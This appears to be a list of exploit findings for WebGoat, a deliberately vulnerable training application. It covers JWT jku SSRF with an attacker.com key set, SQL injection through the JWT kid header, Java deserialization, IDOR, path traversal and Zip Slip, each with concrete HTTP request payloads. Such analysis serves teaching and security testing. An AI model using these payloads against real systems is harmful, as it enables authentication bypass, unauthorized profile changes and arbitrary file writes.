title: JWT Signature Bypass / SSRF via jku Header in JWTHeaderJKUEndpoint
analysis:
Conceptual Exploit Payload:
To exploit this SSRF / JWT Signature Verification Bypass vulnerability, an attacker hosts a malicious JWK Set (JWKS) file on their server (e.g., `http://attacker.com/keys.json`) containing a public key they generated:
```json
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "kid": "key1",
      "alg": "RS256",
      "n": "...",
      "e": "AQAB"
    }
  ]
}
```

The attacker then constructs a JWT with the `jku` header pointing to their server and the `kid` set to `key1`:
```json
{
  "alg": "RS256",
  "jku": "http://attacker.com/keys.json",
  "kid": "key1"
}
```
And claims containing:
```json
{
  "username": "Tom"
}
```

They sign the JWT using their generated RSA private key and submit it as the `token` parameter:
```http
POST /JWT/jku/delete HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9hdHRhY2tlci5jb20va2V5cy5qc29uIiwia2lkIjoia2V5MSJ9.eyJ1c2VybmFtZSI6IlRvbSJ9.signature_value
```

When processed, the WebGoat server performs an HTTP request (SSRF) to `http://attacker.com/keys.json`, retrieves the attacker's public key, and verifies the JWT signature successfully, granting unauthorized access as `Tom`. This demonstrates both Server-Side Request Forgery (SSRF) and cryptographic signature bypass.

title: SQL Injection in JWT kid Header in JWTHeaderKIDEndpoint
analysis:
Conceptual Exploit Payload:
To exploit this SQL injection vulnerability, an attacker constructs a JWT token with a custom `kid` header containing the SQL injection payload. Since `Jwts.parser().parseClaimsJws(token)` has to resolve the key during parsing, the `resolveSigningKeyBytes` method is invoked first, retrieving the untrusted `kid` header.

For example, the attacker sets the header:
```json
{
  "alg": "HS256",
  "kid": "' UNION SELECT 'YWJjZGVmZ2g=' --"
}
```
And the claims:
```json
{
  "username": "Tom"
}
```

The SQL query executed becomes:
```sql
SELECT key FROM jwt_keys WHERE id = '' UNION SELECT 'YWJjZGVmZ2g=' --'
```

This query returns `'YWJjZGVmZ2g='` (which base64 decodes to `'abcdefgh'`). The application then uses `'abcdefgh'` as the HMAC signing key to verify the JWT signature. Since the attacker has signed the JWT using the string `'abcdefgh'` as the HMAC secret, the signature verification succeeds, bypassing authentication/authorization.

```http
POST /JWT/kid/delete HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

token=eyJhbGciOiJIUzI1NiIsImtpZCI6IicgVU5JT04gU0VMRUNUICdZV0p6WkdWbVp3PT0nIC0tIn0.eyJ1c2VybmFtZSI6IlRvbSJ9.7n9bWjF...
```

title: Java Insecure Deserialization in InsecureDeserializationTask
analysis:
Conceptual Exploit Payload:
To exploit this vulnerability, an attacker can generate a malicious serialized Java object payload (using a tool like `ysoserial` targeting classpaths available or using the custom `VulnerableTaskHolder` class inside WebGoat).

The payload is Base64 encoded (optionally replacing standard base64 characters for URL safety if needed) and supplied as the `token` parameter:

```http
POST /InsecureDeserialization/task HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

token=rO0ABXNyADBvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAECAAFMAAd0YXNrTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO3B0AAtzbGVlcCA1MDAw
```

When `ois.readObject()` executes, it will deserialize the untrusted data, triggering the execution of gadget methods and potentially leading to Remote Code Execution (RCE).

title: Insecure Direct Object Reference (IDOR) in IDOREditOtherProfile
analysis:
Conceptual Exploit Payload:
To exploit this IDOR vulnerability, an attacker (who is authenticated as a low-privilege user, say user id `10001`) sends a PUT request to the endpoint `/IDOR/profile/10002` (where `10002` is another user's ID) with a request body specifying a profile modification (e.g., changing role or color):

```http
PUT /IDOR/profile/10002 HTTP/1.1
Host: localhost:8080
Content-Type: application/json
Cookie: JSESSIONID=abcde12345

{
  "userId": "10002",
  "role": 1,
  "color": "red"
}
```

The application checks that the target user ID (`10002`) is not the same as the authenticated user's ID (`10001`), but fails to perform any authorization or privilege checks before updating and saving the profile settings for `10002`, allowing any user to edit any other user's profile.

title: Path Traversal (Arbitrary File Write) in ProfileUploadBase
analysis:
Conceptual Exploit Payload:
To exploit this vulnerability, an attacker submits a multipart form-data request to `/PathTraversal/profile-upload` containing the `uploadedFile` parameter and the `fullName` parameter set to a path traversal sequence:

```http
POST /PathTraversal/profile-upload HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="uploadedFile"; filename="malicious.txt"
Content-Type: text/plain

malicious content here
------WebKitFormBoundary
Content-Disposition: form-data; name="fullName"

../../../../tmp/malicious.txt
------WebKitFormBoundary--
```

The application will resolve `new File(uploadDirectory, fullName)` to `/tmp/malicious.txt` and successfully write the file, leading to arbitrary file write outside of the intended directory. This occurs before any canonicalization/validation checks are performed (which only run in the `attemptWasMade` verification function afterwards).

title: Zip Slip Vulnerability in ProfileZipSlip
analysis:
Conceptual Exploit Payload:
To exploit this vulnerability, an attacker constructs a malicious `.zip` archive containing a file entry named with path traversal sequences, such as `../../../../tmp/zip_slip_exploit.txt`. When this zip file is uploaded to the `/PathTraversal/zip-slip` endpoint:

```http
POST /PathTraversal/zip-slip HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="uploadedFileZipSlip"; filename="exploit.zip"
Content-Type: application/zip

[Zip File Binary Data]
------WebKitFormBoundary--
```

Upon extraction, `e.getName()` returns `../../../../tmp/zip_slip_exploit.txt`, and resolving it against `tmpZipDirectory` allows writing files to `/tmp/zip_slip_exploit.txt`, resulting in arbitrary file write (Zip Slip) outside of the intended directory.
